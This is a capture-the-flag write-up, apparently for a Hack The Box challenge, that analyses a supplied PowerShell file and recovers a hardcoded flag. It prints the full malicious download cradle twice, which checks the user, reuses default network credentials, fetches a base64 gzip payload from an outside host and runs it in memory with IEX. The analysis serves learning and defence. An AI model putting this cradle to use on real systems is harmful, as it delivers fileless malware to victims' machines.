# WRITE_UP #

## WRONG SPOOKY SEASON ##

## 1. Analysis ##
* **Given:** a file named `cradle.ps1`
* **Description:**
* **Hints:**   
    * No hints are given 

## 2. Investigation ##
### POWERSHELL CRADLE ###

Received the `.ps1` file, I use `VSCode` to open it:

```powershell
if([System.Security.Principal.WindowsIdentity]::GetCurrent().Name -ne 'secret_HQ\Arth'){exit};$w = New-Object net.webclient;$w.Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;$d = $w.DownloadString('http://windowsliveupdater.com/updates/33' + '96f3bf5a605cc4' + '1bd0d6e229148' + '2a5/2_34122.gzip.b64');$s = New-Object IO.MemoryStream(,[Convert]::FromBase64String($d));$f = 'H' + 'T' + 'B' + '{p0w3rs' + 'h3ll' + '_Cr4d' + 'l3s_c4n_g3t' + '_th' + '3_j0b_d' + '0n3}';IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
```

Format in order to give it an easier look:
```powershell
if([System.Security.Principal.WindowsIdentity]::GetCurrent().Name -ne 'secret_HQ\Arth'){exit};
$w = New-Object net.webclient;
$w.Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;
$d = $w.DownloadString('http://windowsliveupdater.com/updates/33' + '96f3bf5a605cc4' + '1bd0d6e229148' + '2a5/2_34122.gzip.b64');
$s = New-Object IO.MemoryStream(,[Convert]::FromBase64String($d));$f = 'H' + 'T' + 'B' + '{p0w3rs' + 'h3ll' + '_Cr4d' + 'l3s_c4n_g3t' + '_th' + '3_j0b_d' + '0n3}';
IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
```

First, the program checks whether the current user is `secret_HQ\Arth` or not. If it doesn't match, the script automatically exits.

So what happens if it's the right user? The program will create a `Net.WebClient` object, then use the user's credentials to bypass the `proxy` to make sure the malicious file not get blocked by the firewall. Next, it download a gzip file as a base64 string from the above url. Instead of saving the file to the hard disk, it loads the data directly into the memory, this technique is called `FileLess`.

Next, the program use `Invoke Expression` which is `IEX` (I so remember this from the question in BKSec interview lol) to execute the gzip code after decompress it.


Btw the flag is hardcoded in the command `$f = 'H' + 'T' + 'B' + '{p0w3rs' + 'h3ll' + '_Cr4d' + 'l3s_c4n_g3t' + '_th' + '3_j0b_d' + '0n3}';`

## 3. Solution ##
1. **Result:** The flag is `HTB{p0w3rsh3ll_Cr4dl3s_c4n_g3t_th3_j0b_d0n3}`


